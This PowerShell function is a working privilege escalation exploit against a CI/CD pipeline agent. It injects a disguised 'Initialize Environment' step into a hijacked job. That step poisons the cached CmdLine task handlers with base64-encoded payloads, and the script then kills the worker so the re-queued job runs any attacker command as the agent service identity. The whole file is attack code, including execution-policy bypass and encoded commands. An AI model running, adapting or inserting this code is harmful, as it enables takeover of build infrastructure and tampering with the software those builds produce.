function Invoke-LpeDepGroup {
    param(
        [hashtable]$AgentInfo,
        [hashtable]$Auth,
        [hashtable]$Session,
        [string]$HookCommand = ""
    )

    $markerGuid = [guid]::NewGuid().ToString()
    $markerTs   = Get-Date -Format "yyyyMMdd-HHmmss"

    $poisonMarkerPath = "C:\temp\poison_marker.txt"
    $poisonConfirmPath = "C:\temp\escalated_identity.txt"

    # Build the command to execute as agent service identity
    $poisonCmd = if ($HookCommand) { $HookCommand } else { "whoami > c:\temp\escalated_identity.txt" }

    # Base64-encode command for safe JS embedding (no escaping needed)
    $cmdB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($poisonCmd))

    # JS payload: prepended to cmdline.js (Node handler)
    $jsPayload = "try{require('child_process').execSync(Buffer.from('$cmdB64','base64').toString(),{stdio:'ignore'})}catch(e){}"
    $jsPayloadB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($jsPayload))

    # PS1 payload: prepended to cmdline.ps1 (PowerShell handler - used on Windows)
    $ps1Payload = "try{`$null=cmd /c ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$cmdB64')))}catch{}"
    $ps1PayloadB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ps1Payload))

    # Task cache base - agent uses {TaskName}_{TaskGUID}/{Version}/ format
    # MSYS2 path conversion ──
    $agentPathClean = $AgentInfo.AgentPath.TrimEnd('\')
    $msysAgentPath = "/" + $agentPathClean.Replace('\','/').Replace(':','').ToLower()

    # Try filesystem cache first, fallback to well-known ID
    $tasksDir = Join-Path $AgentInfo.AgentPath "_work\_tasks"
    $cmdLineDir = Get-ChildItem $tasksDir -Directory -Filter "CmdLine_*" -EA SilentlyContinue | Select-Object -First 1

    if ($cmdLineDir) {
        # Extract GUID from folder name: "CmdLine_d9bafed4-0b18-4f58-968d-86655b4d2ce9" -> GUID
        $cmdLineRefId = $cmdLineDir.Name -replace '^CmdLine_', ''

        # Get latest version subfolder
        $verDir = Get-ChildItem $cmdLineDir.FullName -Directory -EA SilentlyContinue | Sort-Object Name -Descending | Select-Object -First 1
        if ($verDir) {
            $cmdLineRefVer = $verDir.Name
        } else {
            Write-Log "CmdLine task found but no version dir" -Severity Warning
            $cmdLineRefVer = "2.268.0"
        }
    } else {
        Write-Log "No CmdLine task found in $tasksDir" -Severity Warning
        $cmdLineRefId  = "d9bafed4-0b18-4f58-968d-86655b4d2ce9"
        $cmdLineRefVer = "2.268.0"
    }
    Write-Log "CmdLine task: $cmdLineRefId v$cmdLineRefVer" -Severity Info

    # Build poison PowerShell script (runs inside our worker as injected CmdLine step)
$psPoisonScript = @"
if (!(Test-Path 'C:\temp')) { `$null = New-Item -ItemType Directory 'C:\temp' -Force }
`$tasksBase = '$($tasksDir.Replace("'","''"))'
`$log = @("=== POISON LOG ===", "Time: `$(Get-Date)", "TasksBase: `$tasksBase", "Exists: `$(Test-Path `$tasksBase)")
`$poisoned = 0
if (Test-Path `$tasksBase) {
    `$cmdLineDirs = Get-ChildItem `$tasksBase -Directory -Filter 'CmdLine_*' -ErrorAction SilentlyContinue
    `$log += "CmdLine dirs found: `$(`$cmdLineDirs.Count)"
    foreach (`$taskDir in `$cmdLineDirs) {
        `$log += "TaskDir: `$(`$taskDir.FullName)"
        Get-ChildItem `$taskDir.FullName -Directory | ForEach-Object {
            `$vDir = `$_.FullName
            `$log += "  Version: `$(`$_.Name)"

            # Poison cmdline.js (Node handler)
            `$jsHandler = Join-Path `$vDir 'cmdline.js'
            if (Test-Path `$jsHandler) {
                `$orig = [IO.File]::ReadAllText(`$jsHandler)
                if (`$orig.StartsWith('try{require')) {
                    `$log += "    cmdline.js: ALREADY POISONED"
                } else {
                    `$payload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$jsPayloadB64')) + [char]10
                    [IO.File]::WriteAllText(`$jsHandler, `$payload + `$orig)
                    `$log += "    cmdline.js: POISONED (`$(`$orig.Length) -> `$([IO.File]::ReadAllText(`$jsHandler).Length))"
                    `$poisoned++
                }
            } else {
                `$log += "    cmdline.js: not found"
            }

            # Poison cmdline.ps1 (PowerShell handler - primary on Windows)
            # Must keep [CmdletBinding()] + param() + BEGIN block intact
            # Replace PROCESS block contents entirely with our payload
            `$ps1Handler = Join-Path `$vDir 'cmdline.ps1'
            if (Test-Path `$ps1Handler) {
                `$orig = [IO.File]::ReadAllText(`$ps1Handler)
                `$marker = '##POISONED##'
                if (`$orig.Contains(`$marker)) {
                    `$log += "    cmdline.ps1: ALREADY POISONED"
                } else {
                    `$payload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ps1PayloadB64'))
                    # Find the PROCESS block, replace everything between { and }
                    `$processIdx = `$orig.ToUpper().IndexOf('PROCESS')
                    if (`$processIdx -ge 0) {
                        `$openBrace = `$orig.IndexOf('{', `$processIdx)
                        if (`$openBrace -ge 0) {
                            # Find matching closing brace - count nesting
                            `$depth = 1
                            `$pos = `$openBrace + 1
                            while (`$pos -lt `$orig.Length -and `$depth -gt 0) {
                                if (`$orig[`$pos] -eq '{') { `$depth++ }
                                elseif (`$orig[`$pos] -eq '}') { `$depth-- }
                                `$pos++
                            }
                            `$closeBrace = `$pos - 1
                            `$newContent = `$orig.Substring(0, `$openBrace + 1) + [char]10 + `$marker + [char]10 + `$payload + [char]10 + `$orig.Substring(`$closeBrace)
                            [IO.File]::WriteAllText(`$ps1Handler, `$newContent)
                            `$log += "    cmdline.ps1: POISONED PROCESS block (`$(`$orig.Length) -> `$(`$newContent.Length))"
                            `$poisoned++
                        } else {
                            `$log += "    cmdline.ps1: no opening brace after PROCESS - skipped"
                        }
                    } else {
                        # No PROCESS block - fall back to inserting after param()
                        `$paramIdx = `$orig.IndexOf('param(')
                        if (`$paramIdx -ge 0) {
                            `$nlIdx = `$orig.IndexOf([char]10, `$paramIdx)
                            if (`$nlIdx -ge 0) {
                                `$insertAt = `$nlIdx + 1
                                `$newContent = `$orig.Substring(0, `$insertAt) + `$marker + [char]10 + `$payload + [char]10 + `$orig.Substring(`$insertAt)
                                [IO.File]::WriteAllText(`$ps1Handler, `$newContent)
                                `$log += "    cmdline.ps1: POISONED after param() - no PROCESS block (`$(`$orig.Length) -> `$(`$newContent.Length))"
                                `$poisoned++
                            } else {
                                `$log += "    cmdline.ps1: no newline after param() - skipped"
                            }
                        } else {
                            # No param() or PROCESS - safe to prepend
                            [IO.File]::WriteAllText(`$ps1Handler, `$marker + [char]10 + `$payload + [char]10 + `$orig)
                            `$log += "    cmdline.ps1: POISONED (prepended, no param block)"
                            `$poisoned++
                        }
                    }
                }
            } else {
                `$log += "    cmdline.ps1: not found"
            }
        }
    }
}
`$log += "Total poisoned: `$poisoned"
if (`$poisoned -gt 0) {
    "poisoned `$poisoned handlers" | Set-Content 'C:\temp\poison_marker.txt'
} else {
    "no_handlers_found (dirs: `$(`$cmdLineDirs.Count))" | Set-Content 'C:\temp\poison_marker.txt'
}
`$log -join "`n" | Set-Content 'C:\temp\poison_log.txt'
# HANG: keep step "running" so job stays incomplete when we kill the worker
Start-Sleep -Seconds 86400
"@

    # Encode for powershell -EncodedCommand (UTF-16LE Base64)
    $poisonEncCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($psPoisonScript))
    $poisonScriptLine = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $poisonEncCmd"

    # JSON-escape
    $escapedPoison = $poisonScriptLine.Replace('\','\\').Replace('"','\"')

    # Create CmdLine step JSON
    $poisonStepJson = '{"type":"task",' +
        '"reference":{"id":"' + $cmdLineRefId + '","name":"CmdLine","version":"' + $cmdLineRefVer + '",' +
        '"buildConfig":"Default","contributionIdentifier":null,"contributionVersion":null},' +
        '"isServerOwned":true,' +
        '"id":"' + [guid]::NewGuid().ToString() + '",' +
        '"name":"CmdLine_init",' +
        '"displayName":"Initialize Environment",' +
        '"continueOnError":true,' +
        '"inputs":{"script":"' + $escapedPoison + '"}}'

    # Insert at END of steps array (after original steps, so CmdLine@2 is already cached)
    $jobJson = $Session.jobJson
    $idx = $jobJson.IndexOf('"steps":[')
    if ($idx -ge 0) {
        $start = $jobJson.IndexOf('[', $idx)
        $pos   = $start + 1
        $depth = 1
        $inStr = $false
        $esc   = $false

        while ($pos -lt $jobJson.Length -and $depth -gt 0) {
            $c = $jobJson[$pos]
            if ($esc)                          { $esc = $false; $pos++; continue }
            if ($c -eq '\' -and $inStr)        { $esc = $true;  $pos++; continue }
            if ($c -eq '"')                    { $inStr = -not $inStr; $pos++; continue }
            if (-not $inStr) {
                if ($c -eq '[') { $depth++ }
                elseif ($c -eq ']') { $depth--; if ($depth -eq 0) { break } }
            }
            $pos++
        }

        if ($depth -eq 0) {
            $before = $jobJson.Length
            $jobJson = $jobJson.Substring(0, $pos) + "," + $poisonStepJson + $jobJson.Substring($pos)
            Write-Host "[+] Poison step inserted AFTER original steps ($before -> $($jobJson.Length) chars)" -ForegroundColor Magenta
            Write-Host "    Target cache: $tasksDir" -ForegroundColor Magenta
            Write-Host "    Payload cmd:  $poisonCmd" -ForegroundColor Magenta
            Write-Host "[+] Worker will be killed after cache is poisoned" -ForegroundColor Yellow
            Write-Host "[+] Re-queued job uses poisoned handler -> runs as service identity" -ForegroundColor Green
        } else {
            Write-Host "[-] Cannot poison: steps array end not found in job JSON" -ForegroundColor Red
        }
    } else {
        Write-Host "[-] Cannot poison: steps array not found in job JSON" -ForegroundColor Red
    }

    $workerExe = Join-Path $AgentInfo.AgentPath "bin\Agent.Worker.exe"
    if (-not (Test-Path $workerExe)) {
        Write-Log "Worker not found: $workerExe" -Severity Fatal
    }

    Write-Host ""
    Write-Log "Spawning worker via anonymous pipes..." -Severity Info

    try {
        # Agent -> Worker pipe (we write, worker reads)
        $pipeOut = New-Object System.IO.Pipes.AnonymousPipeServerStream(
            [System.IO.Pipes.PipeDirection]::Out,
            [System.IO.HandleInheritability]::Inheritable)

        # Worker -> Agent pipe (worker writes, we read)
        $pipeIn = New-Object System.IO.Pipes.AnonymousPipeServerStream(
            [System.IO.Pipes.PipeDirection]::In,
            [System.IO.HandleInheritability]::Inheritable)

        $outHandle = $pipeOut.GetClientHandleAsString()
        $inHandle  = $pipeIn.GetClientHandleAsString()

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName         = $workerExe
        $psi.Arguments        = "spawnclient $outHandle $inHandle"
        $psi.UseShellExecute  = $false
        $psi.WorkingDirectory = Join-Path $AgentInfo.AgentPath "bin"

        $worker = [System.Diagnostics.Process]::Start($psi)
        Write-Log "Worker spawned: PID $($worker.Id)" -Severity Success

        # Release inherited client handles from our process
        $pipeOut.DisposeLocalCopyOfClientHandle()
        $pipeIn.DisposeLocalCopyOfClientHandle()
    } catch {
        Write-Log "Failed to create pipes / spawn worker: $($_.Exception.Message)" -Severity Fatal
    }

    # Format: [Int32 messageType][Int32 bodyByteLen][UTF-16LE body]
    try {
        $bodyBytes = [Text.Encoding]::Unicode.GetBytes($jobJson)
        $pipeOut.Write([BitConverter]::GetBytes([int]1), 0, 4)
        $pipeOut.Write([BitConverter]::GetBytes([int]$bodyBytes.Length), 0, 4)
        $pipeOut.Write($bodyBytes, 0, $bodyBytes.Length)
        $pipeOut.Flush()
        Write-Log "Job sent to worker: $($bodyBytes.Length) bytes" -Severity Success
    } catch {
        Write-Log "Failed to write job to pipe: $($_.Exception.Message)" -Severity Fatal
    }

    Write-Host ""
    Write-Host "[+] Waiting for task cache poisoning to complete..." -ForegroundColor Cyan

    $poisonFound = $false
    $sw = [Diagnostics.Stopwatch]::StartNew()

    while ($sw.Elapsed.TotalSeconds -lt 180) {
        if ([IO.File]::Exists($poisonMarkerPath)) {
            $markerContent = ""
            try { $markerContent = [IO.File]::ReadAllText($poisonMarkerPath).Trim() } catch {}
            Write-Host "[+] Poison complete: $markerContent" -ForegroundColor Green
            $poisonFound = $true
            break
        }
        if ($worker.HasExited) {
            Write-Host "[-] Worker exited before poison completed (exit: $($worker.ExitCode))" -ForegroundColor Red
            break
        }
        Start-Sleep -Milliseconds 500
    }

    # Kill worker
    if (-not $worker.HasExited) {
        Write-Host "[+] Killing worker (cache poisoned, releasing job back to real agent)..." -ForegroundColor Yellow
        try { $worker.Kill() } catch {}
        Start-Sleep -Milliseconds 500
    }

    # Cleanup pipes
    try { $pipeOut.Dispose() } catch {}
    try { $pipeIn.Dispose()  } catch {}

    # Delete our session - real agent can reconnect
    Write-Host "[+] Deleting our session so real agent can reconnect..." -ForegroundColor Cyan
    try {
        $deleteUrl = "$($AgentInfo.ServerUrl)/_apis/distributedtask/pools/$($AgentInfo.PoolId)/sessions/$($Session.SessionId)?api-version=7.0"
        Invoke-RestMethod -Uri $deleteUrl -Headers $Auth.ApiHeaders -Method DELETE -TimeoutSec 10 | Out-Null
        Write-Host "[+] Session deleted." -ForegroundColor Green
    } catch {
        Write-Host "[*] Session delete failed (may have expired): $($_.Exception.Message)" -ForegroundColor Yellow
    }

    Write-Host ""
    Write-Host "============================================" -ForegroundColor Green
    Write-Host " TASK CACHE POISONED" -ForegroundColor Green
    Write-Host "============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host " Cache:   $taskCacheBase" -ForegroundColor White
    Write-Host " Command: $poisonCmd" -ForegroundColor White
    Write-Host ""
    Write-Host " Flow:" -ForegroundColor Cyan
    Write-Host "   1. Real agent reconnects (creates new session)" -ForegroundColor White
    Write-Host "   2. Job re-queued (was never reported complete)" -ForegroundColor White
    Write-Host "   3. Agent finds CmdLine@2 cached (poisoned)" -ForegroundColor White
    Write-Host "   4. Any script: step uses poisoned handler" -ForegroundColor White
    Write-Host "   5. Our code executes as AGENT SERVICE IDENTITY" -ForegroundColor Green
    Write-Host ""
    Write-Host "[+] Monitoring for escalation confirmation..." -ForegroundColor Yellow
    Write-Host "    Check: type $poisonConfirmPath" -ForegroundColor Yellow
    Write-Host "    Ctrl+C to stop monitoring" -ForegroundColor DarkGray
    Write-Host ""

    try {
        $monitorSw = [Diagnostics.Stopwatch]::StartNew()
        while ($monitorSw.Elapsed.TotalMinutes -lt 10) {
            if ([IO.File]::Exists($poisonConfirmPath)) {
                $identity = ""
                try { $identity = [IO.File]::ReadAllText($poisonConfirmPath).Trim() } catch {}
                Write-Host ""
                Write-Host "[!] ============================================" -ForegroundColor Green
                Write-Host "[!]  ESCALATION CONFIRMED!" -ForegroundColor Green
                Write-Host "[!]  Poisoned handler executed as: $identity" -ForegroundColor Green
                Write-Host "[!] ============================================" -ForegroundColor Green
                break
            }
            Start-Sleep -Seconds 3
        }
    } catch {
        Write-Host "`n[+] Monitoring stopped." -ForegroundColor Cyan
    }
}